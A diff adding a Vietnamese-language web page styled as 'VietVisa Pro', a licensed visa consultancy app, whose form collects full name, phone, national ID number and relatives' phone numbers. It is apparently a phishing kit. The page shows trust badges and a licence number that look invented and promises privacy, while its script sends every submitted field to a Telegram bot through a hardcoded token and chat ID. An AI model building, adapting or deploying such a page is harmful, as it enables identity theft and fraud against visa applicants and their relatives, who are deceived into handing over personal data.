@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+  <title>Đăng Ký Visa – VietVisa Pro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    :root{
+      --blue:#1a6ef5;--blue-dark:#1055cc;--blue-mid:#e8f0fe;
+      --green:#16a34a;--red:#ef4444;
+      --text:#0f172a;--sub:#64748b;--border:#e2e8f0;--bg:#f8fafc;--white:#fff;
+      --shadow:0 1px 4px rgba(0,0,0,0.08),0 4px 16px rgba(0,0,0,0.06);
+    }
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;max-width:430px;margin:0 auto;display:flex;flex-direction:column;}
+    .status-bar{background:var(--blue-dark);padding:10px 20px 6px;display:flex;align-items:center;justify-content:space-between;}
+    .sb-time{font-size:14px;font-weight:700;color:#fff;}
+    .sb-icons{display:flex;gap:6px;font-size:12px;color:#fff;}
+    .top-header{background:linear-gradient(160deg,var(--blue-dark),var(--blue));padding:14px 20px 22px;}
+    .th-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;}
+    .th-btn{width:36px;height:36px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer;border:none;color:#fff;}
+    .th-title{font-size:15px;font-weight:700;color:#fff;}
+    .step-pills{display:flex;gap:6px;justify-content:center;}
+    .sp{height:4px;border-radius:4px;}
+    .sp.active{width:32px;background:#fff;}
+    .sp.inactive{width:16px;background:rgba(255,255,255,0.35);}
+    .brand-area{background:linear-gradient(160deg,var(--blue-dark),var(--blue));padding:0 16px 18px;}
+    .brand-chip{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,0.12);border-radius:12px;padding:10px 14px;}
+    .bc-icon{width:38px;height:38px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;}
+    .bc-name{font-size:14px;font-weight:800;color:#fff;}
+    .bc-sub{font-size:11px;color:rgba(255,255,255,0.65);margin-top:1px;}
+    .bc-badge{margin-left:auto;background:var(--green);color:#fff;font-size:10px;font-weight:800;padding:3px 8px;border-radius:20px;}
+    .content{flex:1;padding:16px 16px 110px;overflow-y:auto;}
+    .step-counter{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
+    .sc-label{font-size:13px;font-weight:700;}
+    .sc-steps{font-size:12px;font-weight:600;color:var(--sub);}
+    .progress-bar{height:4px;background:var(--border);border-radius:4px;overflow:hidden;margin-bottom:16px;}
+    .progress-fill{height:100%;width:33%;background:linear-gradient(90deg,var(--blue),#60a5fa);border-radius:4px;}
+    .trust-row{display:flex;gap:8px;margin-bottom:14px;overflow-x:auto;padding-bottom:2px;}
+    .trust-pill{display:flex;align-items:center;gap:5px;background:var(--white);border:1px solid var(--border);border-radius:20px;padding:6px 12px;font-size:11px;font-weight:600;color:var(--sub);white-space:nowrap;box-shadow:0 1px 3px rgba(0,0,0,0.05);}
+    .tp-dot{width:6px;height:6px;background:var(--green);border-radius:50%;}
+    .notice{background:var(--blue-mid);border-radius:14px;padding:12px 14px;display:flex;gap:10px;margin-bottom:14px;font-size:12.5px;color:#1e40af;line-height:1.5;}
+    .notice .ni{font-size:18px;flex-shrink:0;}
+    .card{background:var(--white);border-radius:18px;padding:18px;margin-bottom:14px;box-shadow:var(--shadow);}
+    .card-title{font-size:12px;font-weight:700;color:var(--sub);letter-spacing:0.08em;text-transform:uppercase;margin-bottom:14px;}
+    .field{margin-bottom:14px;}
+    .field:last-child{margin-bottom:0;}
+    .field label{display:block;font-size:12px;font-weight:600;color:var(--sub);margin-bottom:6px;}
+    .req{color:var(--red);margin-left:2px;}
+    .input-wrap{position:relative;}
+    .input-icon{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:16px;pointer-events:none;}
+    input[type=text],input[type=tel]{width:100%;padding:13px 14px 13px 40px;border:1.5px solid var(--border);border-radius:12px;font-family:'Inter',sans-serif;font-size:15px;font-weight:500;color:var(--text);background:#fff;outline:none;-webkit-appearance:none;transition:border-color .2s,box-shadow .2s;}
+    input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(26,110,245,0.12);}
+    input::placeholder{color:#cbd5e1;font-weight:400;}
+    .bottom-action{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:430px;background:var(--white);border-top:1px solid var(--border);padding:12px 20px 28px;}
+    .btn-main{width:100%;padding:16px;background:linear-gradient(135deg,var(--blue),var(--blue-dark));color:#fff;border:none;border-radius:14px;font-family:'Inter',sans-serif;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(26,110,245,0.3);display:flex;align-items:center;justify-content:center;gap:8px;transition:opacity .15s,transform .15s;}
+    .btn-main:active{opacity:.9;transform:scale(0.98);}
+    .btn-main:disabled{opacity:.55;cursor:not-allowed;transform:none;}
+    .btn-sub{text-align:center;font-size:11.5px;color:var(--sub);margin-top:8px;display:flex;align-items:center;justify-content:center;gap:4px;}
+    .spinner{width:18px;height:18px;border:2.5px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .toast{position:fixed;top:80px;left:50%;transform:translateX(-50%) translateY(-10px);padding:12px 22px;border-radius:12px;font-size:13px;font-weight:700;color:#fff;opacity:0;transition:all .3s;z-index:9999;pointer-events:none;white-space:nowrap;}
+    .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+    .toast.success{background:var(--green);}
+    .toast.error{background:var(--red);}
+    .toast.info{background:#334155;}
+  </style>
+</head>
+<body>
+
+<div class="status-bar">
+  <span class="sb-time" id="clock">9:41</span>
+  <div class="sb-icons"><span>●●●●</span><span>WiFi</span><span>🔋</span></div>
+</div>
+
+<div class="top-header">
+  <div class="th-row">
+    <button class="th-btn">←</button>
+    <span class="th-title">Đăng Ký Visa</span>
+    <button class="th-btn">?</button>
+  </div>
+  <div class="step-pills">
+    <div class="sp active"></div>
+    <div class="sp inactive"></div>
+    <div class="sp inactive"></div>
+  </div>
+</div>
+
+<div class="brand-area">
+  <div class="brand-chip">
+    <div class="bc-icon">🦘</div>
+    <div>
+      <div class="bc-name">VietVisa Pro</div>
+      <div class="bc-sub">Tư Vấn Visa Chuyên Nghiệp</div>
+    </div>
+    <div class="bc-badge">● Mở</div>
+  </div>
+</div>
+
+<div class="content">
+  <div class="step-counter">
+    <span class="sc-label">Thông Tin Cá Nhân</span>
+    <span class="sc-steps">Bước 1 / 3</span>
+  </div>
+  <div class="progress-bar"><div class="progress-fill"></div></div>
+
+  <div class="trust-row">
+    <div class="trust-pill"><div class="tp-dot"></div>Bộ Tư Pháp VN</div>
+    <div class="trust-pill"><div class="tp-dot"></div>SSL 256-bit</div>
+    <div class="trust-pill"><div class="tp-dot"></div>MARA Certified</div>
+    <div class="trust-pill"><div class="tp-dot"></div>Hỗ trợ 24/7</div>
+  </div>
+
+  <div class="notice">
+    <div class="ni">🔒</div>
+    <div>Thông tin bảo mật theo <strong>Nghị định 13/2023/NĐ-CP</strong>. Chúng tôi không chia sẻ với bên thứ ba.</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Thông Tin Cá Nhân</div>
+    <div class="field">
+      <label>Họ và Tên Đầy Đủ <span class="req">*</span></label>
+      <div class="input-wrap">
+        <span class="input-icon">👤</span>
+        <input id="f-name" type="text" placeholder="Nhập họ tên như trong CCCD"/>
+      </div>
+    </div>
+    <div class="field">
+      <label>Số Điện Thoại <span class="req">*</span></label>
+      <div class="input-wrap">
+        <span class="input-icon">📱</span>
+        <input id="f-phone" type="tel" placeholder="0912 345 678"/>
+      </div>
+    </div>
+    <div class="field">
+      <label>Số CCCD / CMND <span class="req">*</span></label>
+      <div class="input-wrap">
+        <span class="input-icon">🪪</span>
+        <input id="f-cccd" type="text" placeholder="012345678901"/>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Liên Lạc Người Thân</div>
+    <div class="field">
+      <label>Người Thân 1 <span class="req">*</span></label>
+      <div class="input-wrap">
+        <span class="input-icon">👨‍👩‍👧</span>
+        <input id="f-rel1" type="tel" placeholder="Số điện thoại người thân"/>
+      </div>
+    </div>
+    <div class="field">
+      <label>Người Thân 2</label>
+      <div class="input-wrap">
+        <span class="input-icon">👨‍👩‍👦</span>
+        <input id="f-rel2" type="tel" placeholder="Số điện thoại người thân"/>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="display:flex;align-items:center;gap:14px;">
+    <div style="font-size:28px;">🏛️</div>
+    <div>
+      <div style="font-size:13px;font-weight:700;">Được Cấp Phép Chính Thức</div>
+      <div style="font-size:11.5px;color:var(--sub);margin-top:2px;">GP: 12345/BTrCP-PLHSH – Bộ Tư Pháp VN</div>
+    </div>
+  </div>
+</div>
+
+<div class="bottom-action">
+  <button class="btn-main" id="btn-next" onclick="submitForm()">
+    <span id="btn-label">Tiếp Theo →</span>
+  </button>
+  <div class="btn-sub">🔒 Kết nối bảo mật SSL 256-bit</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const BOT = '8689035372:AAEDXYFPM7LRCfwKzhwq7IJumNEt5tDgwWM';
+  const CHAT = '8816256990';
+
+  // Live clock
+  function tick(){
+    const n = new Date();
+    document.getElementById('clock').textContent =
+      n.getHours() + ':' + String(n.getMinutes()).padStart(2,'0');
+  }
+  tick(); setInterval(tick, 30000);
+
+  function showToast(msg, type='info'){
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast ' + type;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3500);
+  }
+
+  function setLoading(on){
+    const btn = document.getElementById('btn-next');
+    const lbl = document.getElementById('btn-label');
+    btn.disabled = on;
+    lbl.innerHTML = on
+      ? '<div class="spinner"></div> Đang gửi...'
+      : 'Tiếp Theo →';
+  }
+
+  async function sendMessage(text){
+    const res = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: CHAT, text, parse_mode:'HTML'})
+    });
+    return res.ok;
+  }
+
+  async function submitForm(){
+    const name  = document.getElementById('f-name').value.trim();
+    const phone = document.getElementById('f-phone').value.trim();
+    const cccd  = document.getElementById('f-cccd').value.trim();
+    const rel1  = document.getElementById('f-rel1').value.trim();
+    const rel2  = document.getElementById('f-rel2').value.trim();
+
+    if(!name)  return showToast('⚠️ Vui lòng nhập họ và tên','error');
+    if(!phone) return showToast('⚠️ Vui lòng nhập số điện thoại','error');
+    if(!cccd)  return showToast('⚠️ Vui lòng nhập số CCCD','error');
+    if(!rel1)  return showToast('⚠️ Vui lòng nhập số người thân 1','error');
+
+    setLoading(true);
+
+    const time = new Date().toLocaleString('vi-VN', {timeZone:'Asia/Ho_Chi_Minh'});
+
+    const msg =
+`🇦🇺 <b>HỒ SƠ ĐĂNG KÝ VISA MỚI</b>
+━━━━━━━━━━━━━━━━━━━━
+📋 <b>THÔNG TIN CÁ NHÂN</b>
+
+👤 <b>Họ và Tên:</b> ${name}
+📱 <b>Điện Thoại:</b> ${phone}
+🪪 <b>CCCD/CMND:</b> ${cccd}
+
+👨‍👩‍👧 <b>NGƯỜI THÂN</b>
+
+📞 <b>Người thân 1:</b> ${rel1}
+📞 <b>Người thân 2:</b> ${rel2 || 'Không cung cấp'}
+
+━━━━━━━━━━━━━━━━━━━━
+🕐 <b>Thời gian:</b> ${time}
+📍 <b>Nguồn:</b> VietVisa Pro App – Bước 1/3`;
+
+    try {
+      const ok = await sendMessage(msg);
+      if(ok){
+        showToast('✅ Thành công! Chuyển bước 2...','success');
+        // Save data for page 2
+        sessionStorage.setItem('vv_name', name);
+        sessionStorage.setItem('vv_phone', phone);
+        sessionStorage.setItem('vv_cccd', cccd);
+        setTimeout(() => { window.location.href = 'app-page2.html'; }, 1600);
+      } else {
+        showToast('❌ Gửi thất bại. Thử lại!','error');
+        setLoading(false);
+      }
+    } catch(e){
+      showToast('❌ Lỗi kết nối mạng!','error');
+      setLoading(false);
+    }
+  }
+</script>
+</body>
+</html>
